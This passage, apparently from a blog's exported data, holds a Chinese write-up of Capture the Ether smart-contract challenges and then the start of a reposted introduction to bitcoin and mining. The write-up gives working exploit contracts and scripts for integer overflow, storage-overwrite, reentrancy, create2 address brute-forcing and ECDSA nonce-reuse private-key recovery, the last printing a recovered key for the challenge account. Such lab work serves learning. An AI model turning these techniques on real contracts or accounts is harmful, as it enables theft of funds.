\n\n以player身份调用transferfrom，from地址为攻击合约地址，此时第一条require满足，to设置600，第二条满足，由于已经进行过攻击合约调用，所以第三条满足，此时只需要to为任意地址，value&gt;500并且value&lt;&#x3D;600即可构造balanceof[player]的下溢处\n3.Retirement fundCodepragma solidity ^0.4.21;\n\ncontract RetirementFundChallenge &#123;\n    uint256 startBalance;\n    address owner = msg.sender;\n    address beneficiary;\n    uint256 expiration = now + 10 years;\n\n    function RetirementFundChallenge(address player) public payable &#123;\n        require(msg.value == 1 ether);\n\n        beneficiary = player;\n        startBalance = msg.value;\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n\n        if (now &lt; expiration) &#123;\n            // early withdrawal incurs a 10% penalty\n            msg.sender.transfer(address(this).balance * 9 / 10);\n        &#125; else &#123;\n            msg.sender.transfer(address(this).balance);\n        &#125;\n    &#125;//因require限制，该函数调用一定失败\n\n    function collectPenalty() public &#123;\n        require(msg.sender == beneficiary);\n\n        uint256 withdrawn = startBalance - address(this).balance;//存在溢出可以使得withdraw大于0\n\n        // an early withdrawal occurred\n        require(withdrawn > 0);\n\n        // penalty is what's left\n        msg.sender.transfer(address(this).balance);\n    &#125;//仅剩该函数可进行调用，漏洞一定在此处。\n&#125;\n\nAnalyze因为存在溢出漏洞，所以只需address(this).balance大于startbalance即可，问题在于合约中没有fallback()，receive()或function()，所以使用自毁的方式向被攻击合约中转入一定的eth构造withdrawn 下溢处再进行collectPenalty()函数调用即可\nAttackcontract attack&#123;\n    function kill(address addr) public payable&#123;\n        selfdestruct(addr);\n    &#125;\n&#125;\n\n4.MappingCodepragma solidity ^0.4.21;\n\ncontract MappingChallenge &#123;\n    bool public isComplete;\n    uint256[] map;\n\n    function set(uint256 key, uint256 value) public &#123;\n        // Expand dynamic array as needed\n        if (map.length &lt;= key) &#123;\n            map.length = key + 1;\n        &#125;\n\n        map[key] = value;\n    &#125;map.length最大为2**256，所以key应为2**256-1-1\n\n    function get(uint256 key) public view returns (uint256) &#123;\n        return map[key];\n    &#125;\n&#125;\n\nAnalyzemap.length溢出后对bool进行覆盖,类似ethernaut中的aliencodex，之前的博客发过，可以参考一下。\nAttackcontract Attack &#123;\n    MappingChallenge target=MappingChallenge(0xC3Ba5050Ec45990f76474163c5bA673c244aaECA);\n    function pwn() public &#123;\n        target.set(uint256(-1)-1,0);\n    &#125;\n    function pwn2()public&#123;\n        target.set(0-uint(keccak256(abi.encode(uint(1)))),1);\n    &#125;\n&#125;\n\n此时map.length为2**256-1，map[x]的存储地址为keccak256(slot(map)),此处slot(map)为1，map[x]存储地址为keccak256(slot(map))+x,所以构造x为 2^256-keccak256(1),存储其值为1，即可覆盖slot(0)中的bool。\n5.Donationcodepragma solidity ^0.4.21;\n\ncontract DonationChallenge &#123;\n    struct Donation &#123;\n        uint256 timestamp;\n        uint256 etherAmount;\n    &#125;\n    Donation[] public donations;\n\n    address public owner;\n\n    function DonationChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        \n        owner = msg.sender;\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function donate(uint256 etherAmount) public payable &#123;\n        // amount is in ether, but msg.value is in wei\n        uint256 scale = 10**18 * 1 ether;\n        require(msg.value == etherAmount / scale);\n\n        Donation donation;\n        donation.timestamp = now;\n        donation.etherAmount = etherAmount;\n\n        donations.push(donation);\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n        \n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\nAnalyze&amp;Attack执行donate时Donation初始化并传入对应参数，没有强调memory，所以占用storage，实际修改值为slot0以及slot1，所以将etherAmount为int(address(player),16)即可修改owner为player。\n6.Fifty yearsCodepragma solidity ^0.4.21;\n\ncontract FiftyYearsChallenge &#123;\n    struct Contribution &#123;\n        uint256 amount;\n        uint256 unlockTimestamp;\n    &#125;\n    Contribution[] queue;\n    uint256 head;\n\n    address owner;\n    function FiftyYearsChallenge(address player) public payable &#123;\n        require(msg.value == 1 ether);\n\n        owner = player;\n        queue.push(Contribution(msg.value, now + 50 years));\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function upsert(uint256 index, uint256 timestamp) public payable &#123;\n        require(msg.sender == owner);\n\n        if (index >= head &amp;&amp; index &lt; queue.length) &#123;\n            // Update existing contribution amount without updating timestamp.\n            Contribution storage contribution = queue[index];\n            contribution.amount += msg.value;\n        &#125; else &#123;\n            // Append a new contribution. Require that each contribution unlock\n            // at least 1 day after the previous one.\n            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);\n\n            contribution.amount = msg.value;\n            contribution.unlockTimestamp = timestamp;\n            queue.push(contribution);\n        &#125;\n    &#125;\n\n    function withdraw(uint256 index) public &#123;\n        require(msg.sender == owner);\n        require(now >= queue[index].unlockTimestamp);\n\n        // Withdraw this and any earlier contributions.\n        uint256 total = 0;\n        for (uint256 i = head; i &lt;= index; i++) &#123;\n            total += queue[i].amount;\n\n            // Reclaim storage.\n            delete queue[i];\n        &#125;\n\n        // Move the head of the queue forward so we don't have to loop over\n        // already-withdrawn contributions.\n        head = index + 1;\n\n        msg.sender.transfer(total);\n    &#125;\n&#125;\n\nAnalyze看到了结构体，想到了未初始化的存储指针问题，但是进行了mapping并且声明了storage，相当于预防了该问题，所以切入点不在这里。\n分析upsert()函数下的else下的代码，require()中存在整数溢出漏洞，queue[queue.length - 1].unlockTimestamp + 1 days可以溢出为一个非常小的数字。所以使index不满足if条件，设置能够造成溢出的timestamp，调用upsert()函数。\n但是值得注意的是调用完成之后queue.length要变成2，因为else下没有进行预防，contribution.amount &#x3D; msg.value一句会覆盖Contribution[] queue为msg.value(这里是1 wei)，然后再代码结尾处又queue.push(contribution)，所以变为了2。此时head已经被覆盖成了uint256(0-1 days)，此时余额为1 ether+1 wei。\n注意，再次调用upsert()函数queue.length还需要是2，因为如果只有1的话，queue[0].amount将会是1，withdraw之后不能让合约余额归零，如果是3的话，同样调用时msg.value为1wei，queue[0].amount是1 ether，queue[1].amount是2wei，queue[2].amount是3 wei，相加等于1 ether+2 wei+3 wei，而合约余额只有1 ether+2 wei，会造成withdraw函数调用失败.\n再次调用upsert()函数，msg.value还是1wei（目的是queue.length为2），调用之后任意index都将不满足if条件，并且此时的timestamp已经可以设置为0，因为此时queue[queue.length - 1].unlockTimestamp&#x3D;uint256(0-1 days)，timestamp为0可以满足queue[queue.length - 1].unlockTimestamp + 1 days条件(相加恰好溢出为0)，并且在调用完后head被覆盖为0。此时queue[0].amount是1 ether，queue[1].amount是2wei，并且合约余额是1 ether+2 wei，恰好满足条件可以调用withdraw函数。\n至于上述为什么msg.value为1 wei时，amount却等于2，原因就是contribution.amount是读取的数组长度，在进行push时数组长度加1，而withdraw函数中没有声明stroage导致queue[i].amount就是queue数组的长度即queue.length。参考我写过的一篇博客智能合约基础漏洞汇总中的&#x3D;&#x3D;&gt;6.未初始化的存储指针\n因为这个时候now一定大于0，所以满足withdraw下的require条件，使用1（queue.length - 1）为参数调用withdraw即可取走全部的eth，完成挑战。\n这道题比较深入的考察了未初始化存储指针漏洞的原理，作为题库中分数最高的一道题，这个challenge还是非常有含金量的。\nAttack先调用upsert(1,uint256(0-1 days))msg.value为1 wei，再调用upsert(1,0)msg.value为1，在调用withdraw(1)即可。\nhttps://ropsten.etherscan.io/address/0x3BDFf2a063A3F16497F2E7dFBAcc10fDc452AD01\nAccounts1.Fuzzy identitypragma solidity ^0.4.21;\n\ninterface IName &#123;\n    function name() external view returns (bytes32);\n&#125;\n\ncontract FuzzyIdentityChallenge &#123;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(isSmarx(msg.sender));\n        require(isBadCode(msg.sender));\n\n        isComplete = true;\n    &#125;\n\n    function isSmarx(address addr) internal view returns (bool) &#123;\n        return IName(addr).name() == bytes32(\"smarx\");\n    &#125;\n\n    function isBadCode(address _addr) internal pure returns (bool) &#123;\n        bytes20 addr = bytes20(_addr);\n        bytes20 id = hex\"000000000000000000000000000000000badc0de\";\n        bytes20 mask = hex\"000000000000000000000000000000000fffffff\";\n\n        for (uint256 i = 0; i &lt; 34; i++) &#123;\n            if (addr &amp; mask == id) &#123;\n                return true;\n            &#125;\n            mask &lt;&lt;= 4;\n            id &lt;&lt;= 4;\n        &#125;\n\n        return false;\n    &#125;\n&#125;\n\nAnalyze题目要求msg.sender地址中含有badc0de字符，主要考察合约地址计算，create2算法，之前有博客发过可以参考根据两道题目理解create及create2算法，这里不再赘述。\nAttack部署合约所用代码：\ncontract Deployer &#123;\n    // contractBytecode是待部署合约的bytecode\n    address public a;\n    bytes code = hex\"your code\";\n    function deploy(uint salt) internal returns (address)&#123;\n        bytes memory bytecode = code;\n        address addr;\n      \n        assembly &#123;\n          addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)\n        &#125;\n        return addr;\n    &#125;\n    function get(uint salt)public &#123;\n        a=deploy(salt);\n    &#125;\n&#125;\n\n所部署合约的代码：\ncontract IName&#123;\n    bytes32 public name=bytes32(\"smarx\");\n    fu target=fu(0x553c7E7D4bA3F92d85C009CaCB2b995d9e3C79B7);\n    function pwn()public&#123;\n        target.authenticate();\n    &#125;\n&#125;\n\n爆破地址所用代码：\nfrom web3 import Web3,HTTPProvider\n\ndeployingAddr='2bA2D4a1B728D87E9319ce51B3F5086a78f945d9'\n\ncode='60806040527f736d61727800000000000000000000000000000000000000000000000000000060005573553c7e7d4ba3f92d85c009cacb2b995d9e3c79b7600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561008957600080fd5b50610119806100996000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c806306fdde03146037578063dd365b8b146053575b600080fd5b603d605b565b6040518082815260200191505060405180910390f35b60596061565b005b60005481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff1660e01b8152600401600060405180830381600087803b15801560ca57600080fd5b505af115801560dd573d6000803e3d6000fd5b5050505056fea2646970667358221220434aa07aa1939601b3982d4fefcf99b542f6bc06572ed87993a90d2ff7cf687c64736f6c63430006000033'\n\n//待部署合约的bytecode\n\ns=Web3.keccak(hexstr=code)\n\na=''.join(['%02x' % b for b in s])//将s转变为字节\n\ni=0\n\nwhile(1):\n    salt=hex(i)[2:].rjust(64,'0')\n    print(salt)\n    p=Web3.keccak(hexstr=('0xff' + deployingAddr + salt + a))[12:].hex()\n    if 'badc0de' in p:\n        print(salt,p)\n        break\n    i+=1\n\n2.Public KeyCodepragma solidity ^0.4.21;\n\ncontract PublicKeyChallenge &#123;\n    address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31;\n    bool public isComplete;\n\n    function authenticate(bytes publicKey) public &#123;\n        require(address(keccak256(publicKey)) == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyze主要考查了公钥计算，经了解已知交易的rsv以及hash是可以计算publickey的，打开区块链浏览器，找到owner发起的任一交易。\n需要用到js代码\nAttackconst &#123; ethers &#125; = require('./ethers')\nlet provider =new ethers.providers.InfuraProvider('ropsten');\nconsole.log(provider._isProvider)\nlet transactionHash=\"0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb\"\nprovider.getTransaction(transactionHash).then((firstTx) => &#123;\nconsole.log(firstTx);\n    const txData = &#123;\n        gasPrice: firstTx.gasPrice,\n        gasLimit: firstTx.gasLimit,\n        value: firstTx.value,\n        nonce: firstTx.nonce,\n        data: firstTx.data,\n        to: firstTx.to,\n        chainId: firstTx.chainId,\n    &#125;;\n    const signingData = ethers.utils.serializeTransaction(txData);\n    const msgHash = ethers.utils.keccak256(signingData);\n    const signature = &#123; r: firstTx.r, s: firstTx.s, v: firstTx.v &#125;;\n    let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);\n    console.log(rawPublicKey)\n   \n    rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;\n    console.log(`Recovered public key $&#123;rawPublicKey&#125;`);\n    const address = ethers.utils.keccak256(rawPublicKey).slice(26);\n    console.log(`0x$&#123;address&#125;`)\n&#125;);\n\n\n得到结果publickey为0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4\n3.Account TakeoverCodepragma solidity ^0.4.21;\n\ncontract AccountTakeoverChallenge &#123;\n    address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b;\n    bool public isComplete;\n\n    function authenticate() public &#123;\n        require(msg.sender == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyze题目代码只有短短几行，分析起来很简单，需要owner调用函数即可通关。\n不过我们自身显然不是owner，并且也没有提供任何可以进行变量覆盖的漏洞，所以这道题看起来似乎不可能。\n这道题刚看起来也是云里雾里的没有思路，查询了一些资料以及看了大佬们的wp之后明白了考察的问题，SMARX发表过说该owner下只有前两笔交易是来源于他自己，显然切入点在此。\n了解到两笔交易中如果r相同，则他们使用了相同的随机数k，而重复的随机数可以计算账户密钥，得到密钥即可导入账户，在进行调用即可通关\nd &#x3D; (sk-z)&#x2F;r&#x3D; (sk-z) * inverse_mod(r, p) % p\nk &#x3D; (z1-z2)&#x2F;(s1-s2)&#x3D; (z1 – z2)*inverse_mod(s1 – s2,p)%p\n参考：https://xz.aliyun.com/t/2718\n椭圆曲线加密算法：https://xz.aliyun.com/t/6295\nAttackconst EthereumTx = require('./ethereumjs-tx').Transaction\nconst &#123; buffer &#125; = require('stream/consumers')\nconst &#123; ethers &#125; = require('./ethers')\nlet provider =new ethers.providers.InfuraProvider('ropsten');\n// const firstTx=provider.getTransaction('0xd79fc80e7b787802602f3317b7fe67765c14a7d40c3e0dcb266e63657f881396').then((firstTx)=> &#123;\n//     console.log(firstTx);&#125;);\nvar rawTx1 =&#123;\n    nonce: 0,\n    gasPrice: '0x3b9aca00',\n    gasLimit: '0x5208',\n    to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',\n    value: '0x1111d67bb1bb0000',\n    data: '0x',\n    v: '0x29',\n    r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',\n    s: '0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8'\n  &#125;\n//   const secondTx=provider.getTransaction('0x061bf0b4b5fdb64ac475795e9bc5a3978f985919ce6747ce2cfbbcaccaf51009').then((secondTx)=> &#123;\n//     console.log(secondTx);&#125;);\n  var rawTx2 =&#123;\n    nonce: 1,\n    gasPrice: '0x3b9aca00',\n    gasLimit: '0x5208',\n    to: '0x92b28647ae1f3264661f72fb2eb9625a89d88a31',\n    value: '0x1922e95bca330e00',\n    data: '0x',\n    v: '0x29',\n    r: '0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166',\n    s: '0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de'\n  &#125;\n  const tx1 = new EthereumTx(rawTx1,&#123;chain: 'ropsten', hardfork: 'petersburg'&#125;)\n  const tx2 = new EthereumTx(rawTx2,&#123;chain: 'ropsten', hardfork: 'petersburg'&#125;)\n  const z1 = tx1.hash(false).toString(\"hex\");\n  const z2 = tx2.hash(false).toString(\"hex\");\nconsole.log(z1);\nconsole.log(z2);\n\n注意z1和z2处，这个库中的 hash 函数此时要选择参数 false，因为参数为 false 时进行 hash 的对象是不加入签名信息的，也就是我们需要的 z 值，否则默认的参数为 true 得到的就是添加了签名信息的 hash 值，得到的其实就是我们的交易 hash\n解出私钥\nfrom ecdsa.numbertheory import inverse_mod\ndef derivate_privkey(p, r, s1, s2, z1, z2):\n    z = z1 - z2\n    s = s1 - s2\n    r_inv = inverse_mod(r, p)\n    s_inv = inverse_mod(s, p)\n    k = (z * s_inv) % p\n    d = (r_inv * (s1 * k - z1)) % p\n    return d, k\n\nz1 = 0x4f6a8370a435a27724bbc163419042d71b6dcbeb61c060cc6816cda93f57860c\ns1 = 0x2bbd9c2a6285c2b43e728b17bda36a81653dd5f4612a2e0aefdb48043c5108de\nr = 0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166\nz2 = 0x350f3ee8007d817fbd7349c477507f923c4682b3e69bd1df5fbb93b39beb1e04\ns2 = 0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8\np  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\nprint(\"privatekey:%x\\n k:%x\" % derivate_privkey(p,r,s1,s2,z1,z2))\n\n获得结果：\nprivatekey:614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269 k:4b7670ee80409a4acee8ff9351f17001534035ecb552e444e93ca6a4242c8afe\nMiscellaneous1.Assume ownershipCodepragma solidity ^0.4.21;\n\ncontract AssumeOwnershipChallenge &#123;\n    address owner;\n    bool public isComplete;\n\n    function AssumeOwmershipChallenge() public &#123;\n        owner = msg.sender;\n    &#125;\n\n    function authenticate() public &#123;\n        require(msg.sender == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyze&amp;Attack看似是constructor，其实并不是，直接调用即可\n2.Token bankCodepragma solidity ^0.4.21;\n\ninterface ITokenReceiver &#123;\n    function tokenFallback(address from, uint256 value, bytes data) external;\n&#125;\n\ncontract SimpleERC223Token &#123;\n    // Track how many tokens are owned by each address.\n    mapping (address => uint256) public balanceOf;\n\n    string public name = \"Simple ERC223 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function SimpleERC223Token() public &#123;\n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n    &#125;\n\n    function isContract(address _addr) private view returns (bool is_contract) &#123;\n        uint length;\n        assembly &#123;\n            //retrieve the size of the code on target address, this needs assembly\n            length := extcodesize(_addr)\n        &#125;\n        return length > 0;\n    &#125;\n\n    function transfer(address to, uint256 value) public returns (bool success) &#123;\n        bytes memory empty;\n        return transfer(to, value, empty);\n    &#125;\n\n    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;\n        require(balanceOf[msg.sender] >= value);\n\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n\n        if (isContract(to)) &#123;\n            ITokenReceiver(to).tokenFallback(msg.sender, value, data);\n        &#125;\n        return true;\n    &#125;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function approve(address spender, uint256 value)\n        public\n        returns (bool success)\n    &#123;\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    function transferFrom(address from, address to, uint256 value)\n        public\n        returns (bool success)\n    &#123;\n        require(value &lt;= balanceOf[from]);\n        require(value &lt;= allowance[from][msg.sender]);\n\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n        allowance[from][msg.sender] -= value;\n        emit Transfer(from, to, value);\n        return true;\n    &#125;\n&#125;\n\ncontract TokenBankChallenge &#123;\n    SimpleERC223Token public token;\n    mapping(address => uint256) public balanceOf;\n\n    function TokenBankChallenge(address player) public &#123;\n        token = new SimpleERC223Token();\n\n        // Divide up the 1,000,000 tokens, which are all initially assigned to\n        // the token contract's creator (this contract).\n        balanceOf[msg.sender] = 500000 * 10**18;  // half for me\n        balanceOf[player] = 500000 * 10**18;      // half for you\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return token.balanceOf(this) == 0;\n    &#125;\n\n    function tokenFallback(address from, uint256 value, bytes) public &#123;\n        require(msg.sender == address(token));\n        require(balanceOf[from] + value >= balanceOf[from]);\n\n        balanceOf[from] += value;\n    &#125;\n\n    function withdraw(uint256 amount) public &#123;\n        require(balanceOf[msg.sender] >= amount);\n\n        require(token.transfer(msg.sender, amount));\n        balanceOf[msg.sender] -= amount;\n    &#125;\n&#125;\n\nAnalyze这道题做了大概有三个小时左右，个人感觉难度还是不低的，因为来回来去的比较绕人，尤其是在代码长度不短的情况下。\n漏洞其实就是重入漏洞，withdraw函数的require(token.transfer(msg.sender, amount))，调用withdraw函数的调用者做token.transfer中的to，从而可以实现调用攻击合约下的tokenFallback函数，可以在此处构造重入。\n因为此时TokenBankChallenge合约中withdraw函数下的balanceOf[msg.sender] -&#x3D; amount并未修改。\n但是调用withdraw函数有require(balanceOf[msg.sender] &gt;&#x3D; amount)要求，所以应先以player身份将余额取出并转移到攻击合约中去\n清楚攻击流程，开始构造攻击合约\nAttackcontract attack&#123;\n    TokenBankChallenge target=TokenBankChallenge(0x26b989b9525Bb775C8DEDf70FeE40C36B397CE67);\n    SimpleERC223Token target2=SimpleERC223Token(0x5886B2693f246fc2171d1a982CB4F7C1A4D25223);\n    uint public i=1;\n    //先获得来自player的approve\n    //再：\n    function get(address from)public&#123;\n        target2.transferFrom(from,this,500000000000000000000000);\n    &#125;//获得来自player的余额\n    function must()public&#123;\n        target2.transfer(target,500000000000000000000000,\"\");\n    &#125;//使满足题目合约withdraw函数下的第一个require\n    function pwn()public&#123;\n        target.withdraw(500000000000000000000000);\n    &#125;\n    function tokenFallback(address a,uint b,bytes)public returns (bool)&#123;\n        if(i==1)\n        &#123;\n            i++;\n            target.withdraw(500000000000000000000000);\n        &#125;\n    return true;\n    &#125;\n&#125;\n\n","slug":"capture the ether","date":"2022-08-02T02:04:12.275Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"222c93087f6d08ca86d2c8de9bb166ac","title":"bitcoin mining","content":"半技术性文章，为防止连接丢失，放于自己博客，转自于：http://wiki.tidesec.com/docs/jswz/b8b4baea0469fd48115f88ecf075b649\n比特币挖矿 0x01 数字货币\n我们先看一下什么是数字货币，数字货币简称为DC（Digital Currency），是电子货币形式的替代货币，是主要在数字计算机系统（尤其是互联网）上管理、存储或交换的任何货币、货币或类似货币的资产。\n数字货币也可以认为是一种基于节点网络和数字加密算法的虚拟货币。对已有的货币体系来说，无疑是一个巨大的挑战。数字“加密货币”和“加密资产”旨在反映传统货币的部分或全部用途——支付手段、价值存储和记账单位。\n\n 原图来自于：wikipedia，（翻译不准确的话见谅)\n\n\n\n\n\n\n\n\n\n“数字货币是一种不受管制的、数字化的货币，通常由开发者发行和管理，被特定虚拟社区的成员所接受和使用。”\n在论文《数字货币的概念辨析与问题争议》中提到了数字货币的核心特征的三个方面：\n\n由于来自于某些开放的算法，数字货币没有发行主体，因此没有任何人或机构能够控制它的发行。\n由于算法解的数量确定，所以数字货币的总量固定，这从根本上消除了虚拟货币滥发导致通货膨胀的可能。\n由于交易过程需要网络中的各个节点的认可，因此数字货币的交易过程足够安全。\n\n例如加密货币就是数字货币的一种，是一种使用密码学原理来确保交易安全及控制交易单位创造的交易媒介，加密货币中的“加密”是指复杂的密码学。比特币在2009年成为第一个去中心化的加密货币，自此之后数种类似的加密货币被创造。截至 2022 年 2 月，存在超过 10,000 种加密货币。尽管其中许多加密货币几乎没有或没有交易量，但其中一些在专门的支持者和投资者社区中非常受欢迎。\n下面是Investopedia给出的根据市值对代币进行相对排名\n 除比\n特币以外还有很多重要的加密货币\n莱特币 (LTC)是一种替代加密货币，由前 Google 工程师 Charles “Charlie” Lee 于 2011 年 10 月创建。莱特币改编自比特币的开源代码，但做了一些修改。与比特币一样，莱特币基于不受任何中央机构控制的开源全球支付网络。莱特币与比特币的不同之处在于更快的块生成率和使用 Scrypt 作为工作证明方案。\n卡尔达诺（ADA）是一种“Ouroboros 股权证明”加密货币，由工程师、数学家和密码学专家采用基于研究的方法创建。该项目由查尔斯·霍斯金森（Charles Hoskinson）共同创立，他是以太坊最初的五个创始成员之一。在对以太坊的发展方向产生了一些分歧后，他离开了，后来帮助创建了 Cardano。\n波卡(Polkadot)是一种独特的 PoS 加密货币，旨在提供其他区块链之间的互操作性。它的协议旨在连接许可和无许可的区块链以及预言机，以允许系统在一个屋檐下协同工作。Polkadot 的核心组件是它的中继链，它允许不同网络的互操作性。它还允许平行链或具有自己的本机令牌的并行区块链用于特定用例。\n恒星（XLM）是一个开放的区块链网络，旨在通过连接金融机构为大额交易提供企业解决方案。银行和投资公司之间的巨额交易——通常需要几天时间，涉及多个中介机构，并且花费大量资金——现在几乎可以在没有中介机构的情况下立即进行，而且对于进行交易的人来说几乎没有成本。\n狗狗币（DOGE）被一些人视为最初的“memecoin”，随着硬币价格的飙升，在 2021 年引起了轰动。这枚硬币以柴犬的形象作为头像，被一些大公司接受为一种支付方式，包括达拉斯小牛队、克罗诺斯队，以及——也许最引人注目的——SpaceX，一家由埃隆马斯克拥有的美国航空航天制造商.\n币安币（BNB）是一种实用型加密货币，可作为币安交易所交易相关费用的支付方式。按市值计算，它是第三大加密货币。使用代币作为交易所支付手段的人可以进行折扣交易。\n\n然后了解一下什么是比特币，比特币( ₿ )是一种P2P形式的数字货币，是一种去中心化的数字货币，没有中央银行或单一管理员，可以在点对点比特币网络上从一个用户发送到另一个用户，无需中介。交易由网络节点通过密码学进行验证，并记录在称为区块链的公共分布式账本中。每年新增的数量很少，挖取的难度不断加大。\n\n\n\n\n\n\n\n\n\n\n图片地址：https://www.thebalance.com/thmb/OjKKYcwDRcrM1lmXoO2GUjlVr3A=/672x0/filters:max_bytes(150000):strip_icc():format(webp)&#x2F;can-bitcoin-mining-make-a-profit-4157922_final-db1468c8cf124bd8bf28814939df1831.gif\n2010年，比特币只值0.004美元，Laszlo Hanyecz每天就可以挖出上千枚比特币，但是当时加密货币并未流行。他在论坛上面表示愿意用 10000 比特币换两个披萨，但是直到第四天，才有人用25美元买了2个披萨跟他交换了这 10000 比特币，最后成交日的那天也就是 5月22日，被定义为“比特币披萨日”。\nP2P首先理解一下P2P的意思，P2P是英文peer to peer lending，可以理解为个人对个人，点对点。\n区块链比特币的底层技术是区块链，比特币的发明是密码学的一个重要突破，比特币的关键创新也是区块链。\n我们知道区块链是一种类似于账本的软件，记录使用比特币进行的每一笔交易，它被实现为一个块链，每个块包含前一个块的哈希。与银行的账本不同，比特币区块链在计算机网络中分布和验证。没有公司、国家或第三方可以控制它，任何人都可以成为该网络的一部分。区块链技术其实是在比特币被创造出来后出现的，随后，比特币价格大涨，之后开始出现“区块链技术”的概念。区块链中比较重要的就是去中心化，那么我们得知道什么是去中心化？\n去中心化官方给出的去中心化指的是：“在一个分布有众多节点的系统中，每个节点都具有高度自治的特征。节点之间彼此可以自由连接，形成新的连接单元。任何一个节点都可能成为阶段性的中心，但不具备强制性的中心控制功能。节点与节点之间的影响，会通过网络而形成非线性因果关系。这种开放式、扁平化、平等性的系统现象或结构，我们称之为去中心化。”比特币系统就是一个基于“终端账本记录”技术的去中心化点对点模式。那么为什么要去中心化？因为去中心化更加安全可靠，能够降低维护成本，更加公开透明。\n0x03 比特币的所有权在区块链中，比特币被注册到比特币地址。创建一个比特币地址只需要选择一个随机的有效私钥并计算相应的比特币地址。如果私钥丢失，比特币网络将无法识别任何其他所有权证据；硬币然后无法使用，并且实际上丢失了。例如，2013 年，一位用户声称丢失了 7,500 个比特币，当时价值 750 万美元，当时他不小心丢弃了包含他的私钥的硬盘驱动器。大约 20% 的比特币被认为丢失了——按 2018 年 7 月的价格计算，它们的市值约为 200 亿美元。\n0x04 比特币挖矿比特币挖矿是在区块链上验证和记录比特币交易的过程。比特币矿工使用强大的计算机来完成称为哈希的复杂数学函数。\n除了以可信、去中心化的方式验证交易外，比特币挖矿还可以创造了新的比特币，以添加到已经流通的比特币中。这种交易验证方法被称为工作量证明（PoW）。因为矿工必须证明他们已经完成了解决这些复杂数学问题的工作，才能获得验证新比特币交易区块的权利。由于解决这些数学问题需要极高的处理能力，比特币矿工通常使用专门的图形处理单元或GPU，以及专用集成电路或ASIC。\n0x05 比特币挖矿如何运作比特币挖矿是验证新的比特币交易区块并将其添加到比特币区块链的过程。\n从技术上来讲，任何人都可以参与到比特币挖矿的过程中，但多年来比特币挖矿变得越来越竞争，以至于矿工通常需要昂贵的硬件和低成本的电力才能从比特币挖矿中获利。区块奖励每 210,000 个区块（或大约每四年）减半。2009年是50，2013年奖励金额下降到25，2016年变成12.5，因此从 2024 年开始，他们将每块赚取 3.125 个比特币。比特币矿工需要一个加密货币钱包来存储在采矿过程中获得的硬币，钱包是存储发送或接收加密货币所需的私钥的硬件设备或软件应用程序。矿工需要挖矿软件与挖矿硬件挖矿硬件通常是指专门为挖矿而设计的图形处理单元或 GPU，或专用集成电路或ASIC。\n比特币钱包比特币挖掘软件是你用来在你使用的硬件和比特币区块链之间进行通信的软件。一般可以采用两种存储比特币的钱包，一种是托管，另一种是持有自己钱包的私钥的钱包。BitPay、Armory 和 Breadwallet 都是易于使用的比特币钱包。\n比特币挖矿软件CGMiner\n该软件可在 Windows、Mac 和 Linux 上运行，可能是目前比特币矿工最常用的软件。该软件包括远程接口功能、多 GPU 支持、新块的自我检测、风扇速度控制和 CPU 挖掘支持。\nBFGMiner\n该比特币软件基于开源平台。它带有一个USB接口和支持的FPGA板和ASIC芯片，可用于编程和通信。它有几个重要的特性，比如包括能够选择具有最高有效哈希率的频率，并且由于它是开源的，它不需要许可证并且可以在 Windows、Mac 和 Linux 上运行。\nEasyMiner\n该软件可在 Windows、Android 和 Ubuntu (Linux) 系统上运行。它有一个与 CGminer 